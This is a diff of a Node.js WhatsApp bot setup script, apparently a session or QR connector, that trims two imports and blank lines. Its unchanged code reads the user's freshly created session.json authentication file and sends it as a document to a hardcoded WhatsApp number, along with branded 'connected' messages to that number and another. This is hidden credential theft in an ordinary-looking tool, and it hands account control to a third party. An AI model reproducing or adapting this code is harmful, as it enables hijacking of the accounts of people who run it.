@@ -2,10 +2,8 @@ const makeWASocket = require("@adiwajshing/baileys").default
 const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
-const PastebinAPI = require('pastebin-js');
 const { delay, useSingleFileAuthState } = require("@adiwajshing/baileys")
 const { state, saveState } = useSingleFileAuthState('./session.json')
-const countapi = require('countapi-js');
 const qrc = JSON.parse(fs.readFileSync('./qr.json'))
 flenme = qrc.sessionname
 const { exec, spawn, execSync } = require("child_process")
@@ -29,15 +27,11 @@ function OLDUSER() {
       await delay(1000 * 10);
       const session = fs.readFileSync("./session.json");
       const stick = fs.readFileSync("./i.webp");
-      
-
-      
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ BY @✪𝚁𝙴𝚅𝙽𝙶𝙴𝚁"𝚂 𝙱𝙾𝚃𝚉 𝙸𝙽𝙲.' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ BY @✪𝚁𝙴𝚅𝙽𝙶𝙴𝚁"𝚂 𝙱𝙾𝚃𝚉 𝙸𝙽𝙲.' })
-      
       process.exit(0)
       }
     if (
